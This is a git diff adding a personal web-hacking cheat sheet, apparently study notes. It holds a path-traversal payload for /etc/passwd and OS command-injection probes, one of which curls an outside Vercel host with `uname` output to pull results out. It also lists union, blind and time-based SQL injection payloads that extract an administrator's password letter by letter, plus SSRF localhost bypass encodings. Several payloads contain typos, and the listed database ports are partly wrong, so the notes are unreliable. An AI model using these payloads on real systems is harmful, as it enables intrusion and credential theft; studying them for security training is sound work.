@@ -1,1 +1,60 @@
-xss
+wsl    for open linux in windows cmd
+wget -r url to download it perfect.
+
+
+../../../../../../../etc/passwd%00.jpg
+
+
+os injection   uname   pwd 
+Blind os injection   ;sleep+5;          => to sleep+5 secound and see if this work
+
+async os injection   ;curl+https://shop-backend-tau.vercel.app/tryosInjection;          => and look server logs in vercel look if agent curl
+and you can make coomand and see result by `command` like ;curl+https://shop-backend-tau.vercel.app/`uname`;
+will be https://shop-backend-tau.vercel.app/linux
+ 
+
+(SQL) (Oracle) (Microsoft) (PostgreSQL) injection  
+1- -- mean comment 
+2- '+and+1=1--
+3- '+and+1=0--
+4- 'union+selsect+NULL,NULL--
+5- 'union+selsect+1,2--
+6- 'union+selsect+'a',NULL--
+7- 'union+selsect+version(),NULL--
+8- 'union+selsect+username,NULL+from+users--
+
+Blind (SQL) (Response length will be high if true :))
+2- '+anD+1=1-- //////true
+3- '+anD+1=0-- /////false
+9- '+and+(selsect+'a'+from+users+limit+1)='a'--   ///true or false  if we have users table true 
+10- '+and+(selsect+'a'+from+users+WHERE+username='administrator')='a'--   ///true or false  if we have username administrator in users table true 
+11- '+and+(selsect+'a'+from+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a'--
+12- '+and+(selsect+'a'+from+users+WHERE+username='administrator'+AND+LENGTH(password)>10)='a'--
+13- '+and+(selsect+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a'-- a,b,c,d,f,g,e,w,q,t,y,v,u,i,z to know the first letter in password
+14- '+and+(selsect+SUBSTRING(password,2,1)+FROM+users+WHERE+username='administrator')='a'-- a,b,c,d,f,g,e,w,q,t,y,v,u,i,z to know the sec letter in password
+
+Time Base (SQL)
+15- '+anD+SELECT+sleep(10)--
+16- '||sleep(10)--
+
+Time Base (PostgreSQL) 
+15- '+anD+SELECT+pg_sleep(10)--
+16- '||pg_sleep(10)--
+
+Time Base (Microsoft) 
+15- '+anD+WAITFOR+DELAY'0:0:10'--
+16- '||WAITFOR+DELAY'0:0:10'--
+
+Time Base (Oracle) 
+15- '+anD+dbms+pipe.receive_message(("a"),10)--
+16- '||dbms+pipe.receive_message(("a"),10)--
+
+you can search from cheat sheet for any thing..
+https port = 443 or 8080
+http port = 80
+database port = 122 or 143 or 134 or 143 or 3306 or others
+
+SSRF localhost is 
+localhost     , lOcaLHost ,   127.0.0.1   , 127.1    , 017700000001 , 0x7f000001  ,  2130706433
+
+Information Disclosure, Logic Vulnerabilities ,CSRF ,IDOR , OS Injection , XSS Injection, Database Vulnerabilities  , SQL Injection ,SSRF
